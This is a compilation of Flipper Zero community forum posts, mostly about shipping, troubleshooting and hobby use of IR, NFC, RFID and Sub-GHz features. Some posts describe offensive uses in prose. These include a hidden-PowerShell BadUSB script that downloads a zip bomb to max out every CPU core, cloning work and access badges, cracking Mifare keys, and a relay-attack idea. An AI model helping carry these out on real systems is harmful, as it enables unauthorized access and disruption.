Im an all black everything all the time kind of person and desperately want a black flipper zero but it seems like it was KickStarter only with no one selling theirs 2nd hand that I could find. 

Im happy to pay a bit of a premium or wait a bit if anyone knows how I can get my hands on one it would be super appreciated!

I was planning on ordering the flipper from their site but then I found out it was going to take very long like a few months so I ordered one off eBay, the only issue being that it wasnt at retail cost, it was like 50$ marked up but shipping was free so probably like 40$ extra than I wouldve paid, So if u want to get it quick u should buy it off someone but u will have to pay more, but if u wanna save money and are fine with waiting that fine too :)

Is there anyway to get a black case for mine??  Also, looks like the iOS app isn't working very well anymore. The iOS display is not displaying properly, I unistalled/reinstalled it's still the same, and.....  it is saying I don't have an SD card installed, yet the device recognizes it.

Hi guys, the deliveries of the kickstarter orders have almost finished. It is for quite some time already possible to place new orders at their own webshop. I was wondering what the estimate delivery time is after placing an order? I have ordered mine at the end of July this year and I am just curious wether it will be delivered in October, November or maybe next year? I live in Europe by the way
-------------------------------

When I try to order the flipper zero I get an error message which says that the items can't be shipped to my adress (Germany). 
Is it because there are currently no more available or is there another problem? 
Thank you!

Has anyone tried this yet?  I have a collection of switchbot automated IOT robots to help automate my room and would love to control all of them from my single switchbot.  I *recognize* that I could use my phone, but for reasons I don't want to get into, I'm trying to use as little distracting "phone app technology" as possible. 

For reference, Switchbot sells special bluetooth remotes that can be paired to a switchbot and let you decouple the phone.  I'm curious if flipper could be used like that.

Alright So I have my flipper zeros I actually have two of them. Long story. But so I have one that was like an RMA. Thats my boy Amakarou. But my other guy W4npwerl is having some issues. He cant handle files what so ever. Ive reflashed the firmware, multiple times Ive tried to restore from the CLI and do some resets and change out stuff. My boy W4NPWERL dont work. I drag a file. It doesnt work. I take my sd card out of amakarou and put it in him it crashes repeatedly and gives error messages. I dont wanna wait 5 months to mail this out and wait for a replacement it takes so long and with Ukraine war tommorrows never promised for transport. Ive tried all I can debugging this thing. They think Im lieing to them lol as of currently Im supposed to send a video to flipper but Im waiting to get it back from a software engineer I work with who has a background in micro controller systems but thats my only thing weve tried blackmagic, weve even tried some stuff using esp32 we made bc I forgot to buy a Wi-Fi dev board. Any suggestions?

My flipper zero finally arrived in Israel - my country, about two weeks ago and has been taken by the Ministery of communication. Now I got notified by the local shipping company that they got notified it is denied access to the country.
Two years of waiting. About 200$.
Now I am trying to talk to them directly and ask for a reason for refusal.
Any tips? Is anyone here from israel and had problems?

It's a bit of a pipe dream, but here goes: I have a Tomy x Q-Steer (mario kart) Rc car. They're a tiny Remote controlled car that operates on infrared instead of RF.  I cannibalized the original remote for it, and I've been scouring the internets looking for the right raw codes to operate my unit. I found an old russian blog that posted the B channel's .ir file, but not C/D. I, of course, need C/D. 

I hope that I can find someone out there that has C/D. If not, then I hope that if you have the same problem I had, and need B, that this solves your problem. I'd also love to hear back from you to confirm that this code actually operates your device. 

I took the liberty of converting the raw file to something that the flipper recognizes. I'll also pass it along to the right people on the discord/github shortly.

Okay, so, after having issues reading any and all MiFare Ultralight cards, I updated to the latest (official) dev Firmware. Now, the flipper can successfully detect and read that brand of NFC Cards. 

One of the possible options is to unlock the password protected pages, either by entering the password manually, or by authenticating as Am1bo or Xiaomi and... What do the latter two options really do? The flipper even warns that this action can block the card, but no matter if I choose to auth as either of those two, it always manages to read all 16/16 pages ... Is that... The intended behavior? Also, how can it block the card? I'd imagine it'd have to write to the card's chip in order to somehow lock it. 

Note: I don't actually have access to the door the cards were programmed for, it's just a couple of old hotelroom key cards I tend to collect that I have lying around my home.

**not interested in selling to anyone on here. So please dont ask.**

Ive had one for over a month and havent even opened it. Id really love to keep it, but my problem is TIME. I think its a great tool that could serve some utility in my life to some degree. Ive just not set aside time to dive into it and am not sure I even really care at this point. Haha.

Is the learning curve steep? Im not proficient with coding or anything and dont have the dev board or other accessories.

Does it provide enough utility for me to hang onto? Or should I sell it?

I dont watch TV, so programming a remote is out if the question. Theres my garage opener I guess. Not impressed with the Tesla charge port stuff the HID cards other little dongle things that I have access to are to peoples apartments, or gym that they go to. Crap like that. Not interested in closing NFC CC info or anything either. Parking garages might be cool (I only really care about the airport - but they scan your license plate..)..

I saw a post about reading the signal from emergency vehicles that allows them to change stoplights - thats the kind of stuff Im more interested in. Or maybe being able to change the messages on the giant digital signs on the interstate.

What are some of the cool things youve managed to do thus far with your Flipper?

I installed RogueMaster's FW this morning, played with it a bit. Everything went fine, apparently. Then I connected the Flipper to my computer (a Mac), and qFlipper didn't recognized it. I initially thought it was because of the custom FW, so I reinstalled the default, latest version. Still, qFlipper didn't recognized it. Mobile app worked fine, though.

Then, I tried recovery mode. Screen went blank, waited the 30 seconds, released. Nothing. Connected to computer, nothing. Tried turning it on, nothing. Battery was at 100%. When I connect to computer, nothing happens: qFlipper doesn't recognize, it doesn't show as a device on Finder, led won't blink.

What do I do?

We have many different RFID Tags at work, and i try to read the Data from these Tags.

In my opinion there are a problem with the protokoll, so my question is, is it possible, to implement such protokolls later in firmware, or is Flipper by design not able to read such tags.

Here is a link of one of these Tags, but the Website is in german.

I keep seeing everyone say you can't use the flipperzero for rolling codes. My flipper is arriving soon so I wanted to check if my garage door would be clone-able. Its FCC ID is HBW1573 which seems to use security+. I found [this post](https://forum.flipperzero.one/t/request-to-support-chamberlain-rolling-code/3157/13) on the forums that seems to indicate I can pair my flipper with my garage and it will work even with rolling codes but then the same person goes on to say it cannot be done in the same thread so I'm a little confused if this will be doable or not or if i will desync other real garage door remotes by using my flipper.

I remember hearing about this project awhile ago but had completely forgotten about it up until yesterday. 

I just paid for one but after reading some of the reddit posts, it seems like shipping still might be a concern for new buyers. 

What has everyone's turnaround time been like after purchasing their Flipper? By no means am I in a rush to get mine. 

Also I apparently made the mistake of not picking up the silicone case as well... For those of you who already own one, should I pick one of those up as well? 

Thanks for your input!

Would there be interest in a way to use subGHz chat without a computer.

If it is possible would you like to see this Chat Module Keyboard attachment (think early sidekick phone slide out type) trying to get an idea of wants/needs as i am starting projects for the Flipper Zero

Background: [https://www.reddit.com/r/flipperzero/comments/viik4f/device\_charges\_then\_stops\_at\_45\_cant\_charge](https://www.reddit.com/r/flipperzero/comments/viik4f/device_charges_then_stops_at_45_cant_charge/)

Around a month ago my flipper zero suddenly stopped working.  It would only charge up to 45% and would give a "Battery Full" indication, despite not being full, and would discharge at 45 as soon as I unplugged it.  I left it on charging for a full two days only to see no difference.  I've tried replacing the charging cable, reflashing the firmware, doing a factory reset- everything short of taking it apart.   I was very disappointed because I had just started cloning IR remotes with it.

After posting my issue to r/flipperzero, I contacted community support and got in touch with Zoe. She was extremely helpful, listened to my device issues, and after some back and forth discussion I was sent a brand new replacement.    


**THANK YOU FLIPPER CUSTOMER SERVICE!**  I am a huge fan of your kickstarter campaign and have been looking forward to my device ever since 2020.   Thank you for listening to my issues as a customer and for resolving my problem- you guys are awesome!

Hi there,

got my Flipper a few days ago and I love it! I have tried to find out on which frequency my really old garage door opener was sending but the Flipper hasn't picked up any signals. After looking on the web I found out, that the remote is sending with 27.145MHz (it was made by Bosch)

Is there a way to add a 27.145MHz antenna/sender onto the devboard and emulate the remote or is there no hardware for this? Just asking about the hardware part, I think I possibly have to write the firmware part myself.

I wrote a ducky and don't have the full means to test it, it runs a hidden powershell that downloads a zip bomb and extracts it in parallel on however many cpu cores there are and loops the extraction. I can only spare 2 core to my VM, so if somebody has a HPC CPU and would not mind telling me if it actually hits every core that would be cool.

Hey,  I had problems in the beginning like some other German users that the bad USB function produced heavy gibberish while running scripts and searched therefore for some solution. I know this isn't the best solution, but it works for me to play around with the bad USB functionality.

Therefore, I would like to share my Python Script which translates .txt files to the vice versa of the non "translated" output, which results in the correct output. I basically checked every possible key on my Mac keyboard, to find out what bad USB will change it to and made a dictionary to translate it, so the flipper will produce the correct output with the translation.

If others have a better solution, please let me know as I'm currently using this to "translate" my scripts which always adds an extra step.

&amp;#x200B;

**Example Output:**

    Before:  STRING open -a "Google Chrome" "https://www.youtube.com./watch?v=dQw4w9WgXcQ"
    
    After:  STRING open /a @Google Chrome@ @https&gt;&amp;&amp;www.zoutube.com.&amp;watch_v)dQw4w9WgXcQ@

Hi

I have a HID card which I am trying to read/clone with the Flipper. The identifying marks on it are a at the bottom edge of the card; a statement that it is a HID iCLASS DL and a URL - [WWW.XPLAN.COM](https://WWW.XPLAN.COM).  Immediately before the URL there is a five digit number prefixed with a "\*".  Vertically above the URL there are four small dots, aligned with the right hand edge of the card.  

The Flipper does not even seem to know the card is there (either on RFID or NFC) - can anyone help with the reading and cloning?

while trying to upload the  ESP32 Marauder OTA Upload firmware through Arduino IDE, I end up getting the following error message:

Leaving...

`ERROR: ESP32-S2 chip was placed into download mode using GPIO0.`

[`esptool.py`](https://esptool.py) `can not exit the download mode over USB. To run the app, reset the chip manually.`

`To suppress this error, set --after option to 'no_reset'.`

`To suppress this error, set --after option to 'no_reset'.`

when resetting the chip manually, I get the notification sound that a usb device has been disconnected from my computer, but it doesnt connect back (unless i hold boot and reset)

the devboard lights no longer work when connecting it to flipper through GPIO or PC through usb

&amp;#x200B;

any idea how to resolve this error, as well as if its possible to "factory reset" the board?

I seen using the flipper as a usb client isn't practical with spi speeds, but what about host functionality?

Not really important to implement as part of IR support as I was just curious, but I thought it was interesting that the Flipper couldn't clone the remote. Just says "Unknown - 161 samples" with the amount of samples varying each button press

I am trying to flash the Maruder firmware to the WiFi module, and for that i first have to flash OTA firmware to the module.   

Compiling and things goes well, but i get no connection (msg: Failed to connect to ESP32-S2: No serial data received).     
The ESP32-S2 has its own USB-serial interface on-chip.  


I have verified that USB data does get to the ESP32 module, by tapping the D+ / D- line of USB with a logic-analyzer. But it seems that it gets no answer.    
The original firmware works, so i assume that the module and storage is intact.

Pictures: [https://imgur.com/a/zd8t5Z6](https://imgur.com/a/zd8t5Z6) 

So my question, is there another way for me to tap into the ESP32-S2 serial access and bypass the builtin USB, to use my own USB-serial interface.    


Or am i attacking this completely wrong?  


Other things i have tried that didn't work:    
RTFM    
Replace esptool version supplied with arduiono (3.1.0) with newest version (4.3.0)     
Swear    
Use differend version(s) of board definition (also v. 2.0.1-rc1 as suggested in youtube video)     
Scream...     
Loads of other things that i have forgotten in the meantime...

I love the little thing. And I tinker with it when I have the time. But it bothers me that it's apparently so easy to make the mood go from happy to angry, and the animations to go from funny/silly to grim/angry.

I get it, it's a gamified way to have us use and experiment with it often. And I get there's no consequence in the Flipper (mine's name is Amashi) being angry. But the developers could have give us a little more slack - or enable us to turn it off completely.

Yes, Amashi, it has been *two full days* since I played with you last. Get over it.

Hello
Look I'm going to be honest here I know a little bit about hacking and stuff but not much and I am very keen to learn I bought the flipper device because it looked cool at can do cool stuff and because I want to learn more about pentesting hacking and all that sort of stuff I added my garage door remote to the flipper but when I play it back it does nothing I know I probably sound dumb and you can laugh at me all you want but I'm here to learn so I'm hoping we will be decent people on here that will guide me. Anyway when I playback the saved signal it does nothing I've got the right frequency and stuff am I doing stuff wrong I also tried to capture my t4 the car when I push the button that unlocks the door got no signal at all nothing like the device couldn't pick it up am I doing stuff wrong or what thank you very much appreciate anyone's help

Hi, I tried to scan the signal of Elero VarioCom transmitter. According to the manual it should run on 868 Mhz, but Flipper is not finding much there. Just a small peak, that also does not have any effect when being resent. Frequency Analyzer shows nothing, also when I put the transmitter directly on the flipper.

I've checked with someone else, sent my animations and manifest, and it worked fine, and generated the .bm frames.

I added the .bm frames to my folders and tried building again, and it worked too.

Does anyone else has this issue ? Or uses another way to generate the .bm ? Or should it really be generated by the build command I'm using ?

I just found out my AC supports IR remotes. It's a Sharp AF-S85RX. I checked the various repositories and couldn't find it. There are lots of AC remote codes posted but nothing matching a Sharp AC. There must be a simple way of getting this working. I assume that my AC is possibly a rebranding of an OEM product. If not, there must be some overlap somewhere. I can't imagine that none of the AC code files will work. I don't want to try them all, one at a time, but I guess that's doable. Any have any idea of which brand would use the same IR codes?

Even though he was a dolphin he could not handle the moisture in my pocket on a rainy day. I had a rain coat on and  was outside for only half an hour. My pockets were only a bit wet so it was not much moisture.

I just want to give you the advice to leave Flipper home on a rainy day.

Let's hope he comes back to life after some days. I already tried to expose it for a short time to a hairdryer because I assume it still must be wet inside. Also removed the backplate and it's completely dry. Maybe it went through the front but I don't want to completely dismantle it.

Hey flipper devs, i think flipper can work as a *text* Walkie-Talkie with Phone as a optional companion using 433 MHz (or other sub-Ghz)

So my idea is:

On flipper should be launched app with functionality:

* send &amp; receive messages via sub Ghz interface 
* Show last messages on the screen
* Morse code with beep and vibration? (optional cool feature)
* Input should be possible using flipper
* Two modes
   * Broadcast 
   * DirectMessages (on network level same broadcast)
* Also it would be great to support mesh for this (so flipper can act as re-transmitter for messages)
* It would be nice to have App with the same functionality + send more heavy things (like files)
* Security can be handled/outsourced by PGP keys from key server

Two questions, semi related.

1. Does anyone know if there is an easy-ish way to send multiple IR codes in a user defined sequence with delay parameters? Philosophy of use, say I want to turn on tv/soundbar change from 5.1 to dual stereo mode  and change an input and eq preset. This would be useful especially if it could use multiple device types / protocols in a single action, but the delay would be needed to give the equipment time to process and be ready to receive the next command. 

2. This is random but has anyone ever heard of using optical lenses to focus an IR beam to increase the range, I know most consumer devices have a wide flood reflector or TIR to bounce single around in a small space. Without hardware mods are there any off the shelf Macgyver methods that could narrow the beam and range ( I understand you would need to be much more precise with aiming)?

Hey GUIs,

my girlfriend got an NFC tag implanted into her hand on a conference a few years back (I know, I know...) and I was able to read it with the FZ.

The raw data looks like this:

    Filetype: Flipper NFC device
    Version: 2
    # Nfc device type can be UID, Mifare Ultralight, Mifare Classic, Bank card
    Device type: NTAG216
    # UID, ATQA and SAK are common for all formats
    UID: 04 70 92 12 FF 38 80
    ATQA: 44 00
    SAK: 00
    # Mifare Ultralight specific data

    Mifare version: 00 04 04 02 01 00 13 03
    Counter 0: 0
    Tearing 0: 00
    Counter 1: 0

    Page 1: 12 FF 38 80
    Page 2: 55 48 00 00
    Page 3: E1 10 6D 00
etc.

I painfully edited each line to translate the HEX to unicode which kind of worked, but not really good  it was a url which got messed up.

Here is my question: How do I get the formatted data from the .nfc file and how would I create an .nfc file with new data to write it to the chip?

Thanks in advance.

Hi everyone,

So I read the NFC card I use to open the hatch of my building. Apparently it is a Mifare Classic 1K. I used the special scripts to read it, it took something like 3min to find all the 32 keys.

When I try to emulate it, the hatch shows a red light, it does not recognize it.

Is it normal? Is there something I can do to solve this?

Thank you a lot for your answers!

I wanted to be a bit stealthy in the office and use the Flippers RPC functionality over Bluetooth on my Macbook. The simplest approach was to build the iOS app (since it's open source) and add keyboard shortcuts so I can use physical keyboard with the Screen Streaming function.

If you want this yourself, just clone my branch, open it in Xcode, fix provisioning settings and launch it.

 People looking for the FDX-B protocol. The official code still awaits but I got an alternative here.

Protocol Implemented by Dr\_Zlo from discord.

Protocol added in a functional way by maui from discord.I added a menu from which you can choose a protocol to make it go a bit faster. enjoy.

Wanted to play my own WAV-files, but for whatever reason, it does not play at all. When trying to play, WAV player immediately terminates. I learned that WAV-player expects a samplerate of 44100Hz, 2 channels an 8 bit PCMu.

So I converted my file to have these properties; comparison of file which plays, and my own, which doesn't:

    $ file sonicscrewdriver.wav out2.wav 
    sonicscrewdriver.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, stereo 44100 Hz
    out2.wav:             RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, stereo 44100 Hz

Any idea what that could be, before I file a bug?

Hey there,
I'm quite a noob and just ordered my flipper. I saw posts with IR databases and the Tesla charging port opener script, I was wondering if I could just put those files on the SD card and plug it in if they will pop up. Do I need to install any custom firmware or do they work on default

I think the Flipper hardware would be able to upload a payload over USB to a Tegra X1 device mostly a Nintendo Switch.  ;)

There are a few aplications already for the various operating systems.

Sadly I am not a coder, so maybe others can pick-up on this idea.

Hello guys,  after  a few days in which the device worked without any problem, today, after  a reset the pinball machine has apparently bricked. The only way to put  it in DF is to press center+back. I tried the recovery from all the usb  of the pc, without any result. I also changed the cable, with the same  result.

Is there a firmware that unlocks all Sub-GHz frequencies but also lets you keep the contents from your SD card and read them? Ive installed Muddled and it makes my SD card seem empty even though ive loaded it up with infrared files i downloaded, and they work perfectly with the normal firmware. Also, parts of the NFC reading dont work with muddled.

Ive just been trying out the Bluetooth Remote feature. The first time I paired and connected it to my computer it all worked fine, keyboard, mouse etc. If I then leave the Bluetooth remote on the flipper and navigate back to it, the blue light comes on and the computer says it is connected again, but the remote doesnt work. If the cursor was in a text box when it connected, the cursor stops blinking suggesting it is locked up somehow. I removed the device and re-paired and sure enough it worked on the first connection only. 

Any ideas whats happening here or how to fix it?

I played around with NFC and just learned about DESFire Cards which are quite secure. As far as I understand the three pass protocol ([the flow](https://en.wikipedia.org/wiki/Three-pass_protocol?wprov=sfti1)) is still vulnerable to relay attacks. Such an attack should be possible with the flipper and the mobile app (more the cellular of mobile phones) for transmission. Am I missing something or should i be able to build a proof of concept (maybe first with the python flipper cli wrapper)

\- IR remote for my HiFi, that remote is old already, new price to replace would be 80  and now i was able to bridge the contacts with a screwdriver to use the remote a last time and learn the codes to the flipper. awesome!

\- garage opener for my own parking place. hooray

OK so my understanding is that DesFire is too cryptographically large to crack and emulate. Can someone explain at a much lower level on why this is? I can't find anything about the protocol nor can I understand the reason why it's not simply emulation-able with some type of mitm nfc attack or something... 
Please explain!

Hey Flipper-ers,

Im currently on a work trip and have managed to successfully read and save both a 125kHz RFID access card and a NFC hotel room key (with all A &amp; B keys found with the additional reading scripts).

Neither of these cards emulate properly, is this expected or am I doing something wrong?

Subj. After updating through qFlipper to **0.62.1** from the **release** channel, it started showing the following message:

"To unlock, press &lt;RET&gt; &lt;RET&gt; &lt;RET&gt;" (substituted the symbol for brevity).

Pressing &lt;RET&gt; three times leads to a "Locked" animation, and the device stays locked. PIN was set before the update if it matters.

What is going on here?

So I decided to optimize the process and I made a Rick Roll that is full screen and plays at max volume while only havening to type out ONE SINGLE line of code.

Ive found this post Trouble Reading LF RFID Cards (https://www.reddit.com/r/flipperzero/comments/tc7eoy/comment/i0d9k77/), but its not the same issue that Ive been encountered.

The key I have is a BKS RFID key (maybe its model number is XBAWHU?), which looks like this: https://www.identible.de/rfid-keyfob-schluesselanhaenger-teardrop-mifare-classic-1k.html

Ive tried hard reading it as 125 kHz RFID, moving it all around, waiting patiently, but it never works.  However, when trying with RFC mode, Flipper detects the key immediately, it displays:
NFC-A may be:
Mifare Classic
ATQA: 4400 SAK: 08
UID: XX XX XX XX XX XX XX

Ive saved the UID, and tried to emulate the UID later to access the trash room, it didnt work.  BTW, Ive the lasted firmware and just received my Flipper.

Maybe its an incompatible protocol like what has been commented in the above post?  Thanks for any comments.

It seems like I can only leave my Flipper off for a few days before the battery is dead and I need to recharge it. Is this "normal" or is mine faulty or do I have something set that is running my battery down? I have checked all settings and it doesn't look like I have anything that is always on. I mean, I am able to leave other portable electronics off the charger for much longer without the batteries draining.

Hello everyone. My flipper arrived today and I've been having a lot of fun about learning about it's capabilities and such. What I've been wanting to do for about an hour now is to play a game on there (the games that are supplied on the awesome flipper page) but I can't for the life of me figure out how to do it. I tried dragging and dropping to the SD card and no luck. 

Apologies for the basic question but I'd really like to figure out how to get files on there from GitHub. 

Thanks a lot

Ive been emailing Sergio at support since last Tuesday. My flipper was supposed to arrive last week but usps marked it as no access to mailbox which was weird since I got my mail and other packages that day. This is obviously on usps but the flipper customer service team is zero help at all. 

I emailed them and told them about the situation and they told me to be patient. 3 days after delivery attempt pass and Ive already gone to my local post office twice this week and start a missing mail claim. 

I updated Sergio at Flipper and he emails me telling me to keep waiting and if nothing arrives by Monday to contact them. 

Still nothing has arrived. I contact him Monday night and he responds today with 

Hello.

Thank you for contacting us.

The fastest way for you to get the device is to contact USPS regarding this issue. 

Are you able to do so?

After telling him repeatedly via email Ive gone to my post office twice already. At this point Im completely out of options as theyre not being helpful at all and will be filing a chargeback with my credit card

Im sure the device is amazing but the whole ordering process, wait times, bad customer service turned of off from Flipper. Would 100% no recommend them to anyone.

Hi, Im having a problem with NFC - I can sometimes read from my Flipper but when I emulate it back I cant pick anything up from my phone.

Is this a common problem? Am I using the wrong NFC cards?

Thanks!

My hands were so dry after coming out of work. Dropped my babyom concrete footpath. It's ok. No scratches on screen just a few dents on edges and corner.

Time for body make over. I'm thinking steam punk theme. Been pondering it for a while now. Plus it will give it extra protection if dropped again in future. 

I'll post updates when it begins with pictures.

Has anyone customized the firmware to write Mifare Classic cards? I'm not sure how difficult that is to do. I just received my RC522 board today. I'm going to build out the basic card reader with an Arduino and a display. It sounds like that will allow data to be written to the cards. 

I'm a bit surprised that the current firmware doesn't always display the card data. It's not that important. I've been downloading the nfc files and reading them with VSCode. It would be nice to quickly see part of the card data on the Flipper display.

All of a sudden I'm having bluetooth and sub-ghz issues.

I can pair a phone, but it will drop in and out, constantly reconnect and sometimes want a re-pairing code.  Sometimes mirror works, sometimes it won't.  Will not re-sync, hangs mid way through.  Tried two different phones. 

I can no longer pop tesla fuel doors, but another sub-ghz remote works intermittently. 

I've tried DFU restore to stock firmware and still have the issue.

Have my antennas burnt out or something?

Didn't want to pay 20.00 for shipping for a screen protector for my flipper.  Got a generic screen protector, put it in my cricut and was able to make a decent screen protector for cheap.  Even made spares, fits well enough that I can feel the edge but I know it won't pop off.

I tried playing a lil prank on my buddy who owns a tesla, I tried running the AM270 and AM650 signals from the "awesome-flipperzero" github from my car about 5 feet away and it wasnt working. Do i need to be closer? or does the flipper need to be outside of the car?

Is there a way to copy captured IR and Sub frequencies from one Flipper to another? Without and custom stuff or in depth fiddling.

I am thinking about getting more then one but don't want the hassle of recording my NFC stuff multiple time to multiple devices. Everything I have seen says yes and others say not natively but with FW tweaks

So, if you try to scan a card or device subghz/NFC and possibly other (i've only tried those so far), if the protocol it uses is not supported, the flipper just ignores the device/card.   
Surely if Flipper knows that something is there and it can "see" a signal, it would be a good thing to at least have a message saying "yup i see a card, but it isn't using a protocol that flipper supports" or something..  or , ideally "this card uses protocol XYZ which flipper does not yet support" (don't know if its possible to determine the protocol without 'supporting' that protocol)

Hey,

just wanted to ask if someone who ordered the flipper to germany could share his shipment status?

I got the confirmation that it was shipped by YunExpress on 2022/06/29 and that the origin is Netherlands. Since then no update on the shipment status and I'm wondering a bit because shipment from the Netherlands should not take that long...

Thanks!

Howdy Reddit folk 

me and u/Bettse are implementing Mfkey32v2 on the flipper to Calculate Mifare classic keys. 

currently there is only one attack for mifare classic on the flipper, a dictionary attack which only works if the keys on your credential are in the dictionary, which they very well may not. 

this method allows you to extract the keys yourself through the emulation UID process. 

you can currently do this through using the debug logs and calculating them using mfkey32v2 but we will be making this into a GUI application on the flipper itself so its all handsfree. 

Heres the github and code needed to do it right now. feel free to DM me if you need any help with setup/usage or if you arent able to use mfkey32v2 by yourself. ill crack them for you with provided logs :)

Hey,

I'm playing with some BadUSB scripts and I've noticed that its displaying "\\" (backslash) as "#" (hash).

I'm guessing this is because I'm using a UK keyboard?

Is there an easy fix for this?

Just some thoughts I had while drinking with friends and playing with this. I would like to clarify that I am having a ton of fun with this device and these "suggestions" don't mean shit.

\- Creation of a folder for plugins called applications where the user can drag and drop files into the SD card would be great because I have no idea how to make flappy bird work. Maybe make the bit of firmware needed to make it work, easier to implement.

\- Allow users to re-order the main functions OR  just test and survey for the two most popular functions (which would just be more UX research heavy)

\- Allow tags/ some kind of delineation in BadUSB for the top 2/3 most common OSs

\- Customizable functionality of shortcut buttons after wake, there are 6 buttons you can press after wake, but many don't appeal to all users.

\- Make Dumb Mode play a Specific Plugin like Snake GameOn a user level... 

\- Clarify what levels do and what data the flipper has collected. (also clarify why their level this meaningful functionally?)

\- Option to make a saved IR Remote look like the Universal Remote Schematic (bonus points if it can be re-adjusted to other common use cases like LED bulb remotes.)

\- A Favorites Menu that only holds the users determined favorites no matter what frequency and type they are on (which would bypass the need to customize shortcuts after wake)

\- Personally, I want to check all types of frequencies at the same time, instead of googling the type for whatever Im holding onto, maybe specifically, sub GHz would need an extra prompt for this kind of tool that suggests that the frequency they are looking for would need some parsing of some settings but does this hardware allow it?

\- Ive noticed that in many cases the menu would benefit from having two vertical columns instead of one

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

\- 9 main functions on base model without addons but I can only get between my saved functions by multiple presses of the same button. (after wake, down, and then left or right), yet there are 6 accessible buttons after the wake screen. You could display level after unlock instead of sacrificing the right arrow key input, and just have it disappear in a timely manner, it would save you a button to make more useful to users.

\- The 9 main functions are not alphabetical so was there testing on what would be most popular?

\- No integrated Lock Button relies on muscle memory (press up and then ok) 

\- buttons feel like Ill break them eventually

\- white body feels very easy to chip and stain in a pocket for a 170-dollar device.

Thats all I've got at this moment, I LOVE the graphic design but there are functional issues if they want to progress to the much anticipated "Flipper One" and still want users to enjoy their devices.

I've been using my flipper to help unlock some amiibo stuff on my switch, but I've noticed sometimes it scans really quickly, other times it takes forever. At first I thought it could have been my joycon.  I know one of them is defective, drift, so who knows, maybe the other was as well. I tried it with my pro controller for about 10 minutes and couldn't read anything.  Today when I tried to add them to the Ally app in my iPhone (12 pro max) it my phone couldn't pick it up either.  My flipper doesn't seem have have any issues reading NFC tags thou. Id appreciate any suggestions

I live near a golf course and there is this terrible terrible alarm that goes off if there is lightning the area. It sounds like siren head tbh. Well I noticed they are all scattered around the area and all have a solar panel and an antenna. Looks like an hf antenna. What are the chances they are really simple and just uses a static key to trigger the alarm?

So excited my Flipper arrived today! I had a few questions for the ones that have had their devices for a while now. What do you like using your devices for? What's your favorite feature? And what custom firmware should I get (if any)? I'm farily new to the scene as a whole, so I'm just trying to learn and tinker around with things! But I definitely would like to use the device to its fullest! I havent updated the firmware at all yet, so far just took it out of the box and poked around on the devices UI. I haven't looked into the custom firmwares yet, but wasn't entirely sure the differences that they offer, compared to the stock/official flipper firmwares? Thanks ahead of time!!

Secondly, I would like to know if anybody has had issues with corrupted data from any certain brand of sd card. thank you everyone.

Hi flipper owners , I've been having lots of fun with my flipper now it's finally here in the UK, I've managed to clone my work ID to use my flipper to access the office when I forgot my badge or so I can print at work with it.

So Ive been trying to get consistent functionality for Amiibo emulation. Its not been great so far and Im wondering if Im missing something. 

Im emulating an official amiibo that I own, scanning the tag, and then getting the info via Mf Ultralight. The first tag worked and was recognized. If I now tag it again, the Nintendo Switch gives an error chime and text stating This is not an Amiibo. Monster Hunter just reads from the Amiibo; it doesnt write to the tag. Im curious if anyone has seen this and came up with options on how to avoid it. Ive checked google, the official forums for Flipper, and this sub. So far Ive not had much luck.

Hello everyone, I hope you're well. I've been interested in getting one of these since the very beginning but I kissed the KS by a week as I didn't have the money, now I'm here about to press pay now but I thought I'd jump on here and ask a few questions. 

I want to use this to mess about with on a casual basis and want to learn from it, maybe go onto to more complex stuff in the future but this will be my very first introduction to "hacking" ... Anyway, here are my questions:

1) I am limited to having a computer at the moment. I can borrow a small Chromebook from time to time but I won't have it constantly. Is a computer absolutely essential to use a Flipper properly? 

2) With the initial update when you first get it out the box can I update that via the app? 

3) For a real beginner how easy is it to pick up and get your head around? I'm all for learning stuff from the internet but I'm talking about when I first pick it up. 

Thank you so much for your help in advance. I hope these questions aren't too stupid to warrant an answer

I havent gotten mine yet, but i see pictures online that there is an IPX connector next to the sub ghz antenna, is it possible to do an external antenna simply by plugging into that?

i would love a 315/433 dual element yagi so i can remote start my car from across town, lol.

For some reason, my Flipper Zero was not able to read the 125khz signal from my Mircom residential key fob. I saw there were online services that could clone the key knowing only the serial number which got me very curious. Fast forward a couple of hours, I was able to add the code manually to the device.

If you happen to have the same issue and your key fob has a serial number printed on it, I hope this helps:

Say my key fob printed ID is 123 45678 (notice the space separating the ID).

- Convert 123 to hex
- Convert 45678 to hex
- Concatenate both values
- Add the new value manually to Flipper Zero (HID H10301)

Hi folks,

I had a little trouble getting qFlipper to run on my Linux machine today, so I am just documenting the steps I went through to get it working.

My initial problem was that the official qFlipper AppImage refused to show a window under wayland. I tried setting the QT_QPA_PLATFORM=wayland as suggested, but it looks like the wayland backend plugin isn't included in the AppImage.

I then opted to build it myself from source, which required the following dependencies to be installed:

    sudo pacman -S qt5-base qt5-declarative qt5-graphicaleffects qt5-quickcontrols qt5-quickcontrols2 qt5-serialport qt5-tools

I made my installation folder in /opt

    sudo mkdir /opt/qflipper

I then downloaded the qFlipper source code, and followed the installation instructions from the repo:

    git clone https://github.com/flipperdevices/qFlipper.git --recursive
    cd qFlipper

    git checkout 1.1.0 # optional, I wanted to build the latest stable version

    mkdir build &amp;&amp; cd build
    qmake ../qFlipper.pro PREFIX=/opt/qflipper -spec linux-g++ CONFIG+=qtquickcompiler
    make qmake_all 
    make -j8
    sudo make install

Then, I also needed to add my user to the 'uucp' group to allow access to serial ports

    sudo gpasswd -a $USER uucp

And then had to add the udev rules for access to the flipper device

    sudo cp /opt/qflipper/lib/udev/rules.d/42-flipperzero.rules /etc/udev/rules.d/

After a reboot (to allow the udev rules and group change to take effect), I could then launch the qflipper application via:

    QT_QPA_PLATFORM=wayland /opt/qflipper/bin/qFlipper

Hope this helps anyone else with a similar problem!

hello.  I have the F0 since yesterday and I can't get it to connect to the app, I get it to Link by bluetooth, I put the code and it stays charging and from there it doesn't happen, I restart the phone and the F0 and it always does the same.  I unpair it from the mobile and the F0 and do it all again and it does the same.  I hope someone can help me.  Thanks a lot.

I placed a pre-order in Dec 2021 and recently moved to a new address.

In March I received an email stating that Flipper would verify the address a week and 2 days before locking the address. Did anyone actually receive this?

Now I'm stuck in a loop where they shipped my flipper, but to my old address. The courier refuses to speak to me for any updates regarding my address and Flipper support just say "Like stated before, we are not able to make any changes at this point."

Has anyone else had similar issues? Were you able to resolve it?

Hi everyone, I was looking for a project for a guitar tuner with an Arduino, and I found this:

